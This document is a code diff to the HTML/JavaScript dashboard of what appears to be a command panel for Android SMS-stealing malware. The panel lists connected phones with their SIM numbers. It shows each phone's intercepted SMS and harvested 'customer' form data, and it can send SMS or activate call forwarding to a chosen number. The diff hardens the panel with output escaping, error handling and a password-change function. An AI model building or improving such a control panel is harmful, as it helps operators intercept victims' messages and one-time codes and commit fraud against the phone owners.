@@ -111,6 +111,11 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
+        function escapeAttr(str) {
+            if (str === undefined || str === null) return '';
+            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        }
+
         const socket = io();
         let devices = [];
         let currentFilter = 'all';
@@ -145,7 +150,6 @@
         }
 
         socket.on('dashboard-update', () => fetchData(false));
-        socket.on('sms-list-update', () => fetchData(false)); // Auto refresh when new SMS arrives
 
         function filter(type, btn) {
             currentFilter = type;
@@ -179,24 +183,25 @@
                 const serialNum = idx + 1;
                 const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 50 ? 'fa-battery-half' : 'fa-battery-quarter';
                 const statusBadge = `<span style="display:inline-block;border:2px solid #FFD700;border-radius:16px;padding:2px 16px;font-weight:bold;${d.isOnline ? 'color:#43a047;' : 'color:#d32f2f;'}background:#222;font-size:13px;">${d.isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
+                const identifier = d._id || d.deviceId || d.serialNumber;
                 const card = document.createElement('div');
                 card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
                 card.style = 'border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0;position:relative;max-width:320px;margin:auto;border-radius:32px;background:#f8fafc;padding-top:60px;padding-bottom:24px;overflow:hidden;';
                 card.innerHTML = `
-                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})"></i></div>
+                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${identifier}', ${!d.isPinned})"></i></div>
                     <div style="position:absolute;top:12px;right:18px;display:flex;align-items:center;gap:4px;"><i class="fas ${batteryIcon}" style="color:${d.battery>20?'#43a047':'#d32f2f'};font-size:24px;"></i><span style="font-weight:bold;">${d.battery||0}%</span></div>
-                    <div class="serial-badge" style="left:50%;transform:translateX(-50%);top:6px;min-width:120px;text-align:center;">#${serialNum} <br> <small>${d.model||''}</small></div>
+                    <div class="serial-badge" style="left:50%;transform:translateX(-50%);top:6px;min-width:120px;text-align:center;">#${serialNum} <br> <small>${escapeAttr(d.model||'')}</small></div>
                     <div class="info" style="text-align:center;">${statusBadge}</div>
-                    <div class="info"><b>SIM1:</b> ${d.sim1||'N/A'}</div>
-                    <div class="info"><b>SIM2:</b> ${d.sim2||'N/A'}</div>
+                    <div class="info"><b>SIM1:</b> ${escapeAttr(d.sim1||'N/A')}</div>
+                    <div class="info"><b>SIM2:</b> ${escapeAttr(d.sim2||'N/A')}</div>
                     <div class="info"><b>Last Seen:</b> ${formatLastSeen(d.lastSeen)}</div>
                     <div class="btns">
-                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewAction('${d.deviceId}', 'VIEW_DATA')"><i class="fas fa-eye"></i> VIEW DATA</button>
-                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewAction('${d.deviceId}', 'VIEW_SMS')"><i class="fas fa-envelope"></i> VIEW SMS</button>
-                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewAction('${d.deviceId}', 'VIEW_FORM')"><i class="fas fa-file-alt"></i> FORM DATA</button>
-                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
-                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
-                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
+                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewAction('${identifier}', 'VIEW_DATA')"><i class="fas fa-eye"></i> VIEW DATA</button>
+                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewAction('${identifier}', 'VIEW_SMS')"><i class="fas fa-envelope"></i> VIEW SMS</button>
+                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewAction('${identifier}', 'VIEW_FORM')"><i class="fas fa-file-alt"></i> FORM DATA</button>
+                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${identifier}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
+                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${identifier}')"><i class="fas fa-phone"></i> CALL FWD</button>
+                        <button class="btn-sm btn-del" onclick="del('${identifier}')"><i class="fas fa-trash"></i> DELETE</button>
                     </div>`;
                 grid.appendChild(card);
             });
@@ -208,7 +213,7 @@
             const title = action === 'VIEW_DATA' ? '📋 Device Details' : action === 'VIEW_SMS' ? '📬 SMS Messages' : '📝 Form Data';
             
             if (action !== 'VIEW_SMS') document.getElementById('modalHeaderTitle').innerText = title;
-            document.getElementById(bodyId).innerHTML = '<div class="no-data">Loading cached data...</div>';
+            document.getElementById(bodyId).innerHTML = '<div class="no-data">Loading...</div>';
             document.getElementById(modalId).classList.add('show');
 
             try {
@@ -220,8 +225,6 @@
                     return;
                 }
 
-                if (data.isOnline) toast('Device is Online! Refreshing latest data...');
-
                 if (action === 'VIEW_DATA') showDeviceData(data.device);
                 if (action === 'VIEW_FORM') showFormData(data.customerData);
                 if (action === 'VIEW_SMS') showSmsData(data.messages, deviceId);
@@ -231,7 +234,7 @@
 
         function showDeviceData(d) {
             let html = `<div style="background:#e3f2fd;padding:15px;border-radius:8px;">`;
-            const fields = [['Model', d.model], ['Serial', d.serialNumber], ['Android', d.androidVersion], ['SIM 1', d.sim1], ['SIM 2', d.sim2], ['Battery', d.battery + '%'], ['Install Date', new Date(d.registrationTimestamp).toLocaleString()]];
+            const fields = [['Model', d.model], ['Serial', d.serialNumber], ['Android', d.androidVersion], ['SIM 1', d.sim1], ['SIM 2', d.sim2], ['Battery', d.battery + '%'], ['Install Date', d.registrationTimestamp ? new Date(d.registrationTimestamp).toLocaleString() : 'N/A']];
             fields.forEach(f => {
                 html += `<div style="display:flex;justify-content:space-between;border-bottom:1px solid #ddd;padding:8px 0;"><b>${f[0]}:</b> <span>${f[1]||'N/A'}</span></div>`;
             });
@@ -241,33 +244,32 @@
 
         function showFormData(data) {
             let html = `<h3>Submitted Form Data</h3>`;
-            if (Object.keys(data).length === 0) html += `<div class="no-data">No form data found</div>`;
+            if (!data || Object.keys(data).length === 0) html += `<div class="no-data">No form data found</div>`;
             else {
                 Object.entries(data).forEach(([k, v]) => {
-                    html += `<div style="background:#fffde7;padding:12px;margin-bottom:8px;border-radius:8px;border-left:5px solid #ff9800;"><b>${k}:</b> ${v}</div>`;
+                    html += `<div style="background:#fffde7;padding:12px;margin-bottom:8px;border-radius:8px;border-left:5px solid #ff9800;"><b>${escapeAttr(k)}:</b> ${escapeAttr(v)}</div>`;
                 });
             }
             document.getElementById('modalBody').innerHTML = html;
         }
 
         function showSmsData(msgs, deviceId) {
-            if (msgs.length === 0) {
+            if (!msgs || msgs.length === 0) {
                 document.getElementById('smsModalBody').innerHTML = '<div class="no-data">No SMS found</div>';
                 return;
             }
             let html = msgs.map((m, idx) => `
                 <div style="background:#fff;padding:10px;margin-bottom:8px;border-radius:8px;border-left:5px solid #1976d2;display:flex;justify-content:space-between;">
                     <div>
-                        <div style="color:#1976d2;font-weight:bold;">${idx+1}. From: ${m.address||m.from}</div>
-                        <div>${m.body||m.message}</div>
+                        <div style="color:#1976d2;font-weight:bold;">${idx+1}. From: ${escapeAttr(m.address||m.from)}</div>
+                        <div>${escapeAttr(m.body||m.message)}</div>
                         <small style="color:#888;">${formatLastSeen(m.date||m.time)}</small>
                     </div>
-                    <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" onclick="navigator.clipboard.writeText('${m.body||m.message}');toast('Copied')"></i>
+                    <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" onclick="navigator.clipboard.writeText('${escapeAttr(m.body||m.message)}');toast('Copied')"></i>
                 </div>`).join('');
             document.getElementById('smsModalBody').innerHTML = html;
         }
 
-        // --- Other functions (Send SMS, Call Fwd, Delete) same as before ---
         function showSendSmsModal(deviceId) {
             document.getElementById('actionModalTitle').innerText = 'Send SMS';
             document.getElementById('actionModalBody').innerHTML = `
@@ -294,10 +296,12 @@
             }
             if (action === 'CALL_FORWARD_ACTIVATE') data.number = document.getElementById('cfNumber').value;
 
-            const res = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action, data }) });
-            const d = await res.json();
-            toast(d.message || (d.success ? 'Command Sent' : 'Device Offline'), !d.success);
-            if (d.success) closeModal('actionModal');
+            try {
+                const res = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action, data }) });
+                const d = await res.json();
+                toast(d.message || (d.success ? 'Command Sent' : 'Error'), !d.success);
+                if (d.success) closeModal('actionModal');
+            } catch(e) { toast('Error', true); }
         }
 
         async function togglePin(id, status) {
@@ -308,10 +312,26 @@
         function del(deviceId) {
             const p = prompt("Admin Password:");
             if (!p) return;
-            fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, password: p }) }).then(() => fetchData(false));
+            fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, password: p }) })
+                .then(r => r.json())
+                .then(d => {
+                    if(d.success) toast('Deleted');
+                    else toast(d.message || 'Error', true);
+                    fetchData(false);
+                });
         }
 
         function closeModal(id) { document.getElementById(id).classList.remove('show'); }
+
+        async function changePass() {
+            const oldP = prompt("Old Password:");
+            if(!oldP) return;
+            const newP = prompt("New Password:");
+            if(!newP) return;
+            const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword: oldP, newPassword: newP }) });
+            const d = await r.json();
+            toast(d.success ? 'Success' : d.message, !d.success);
+        }
     </script>
 </body>
 </html>
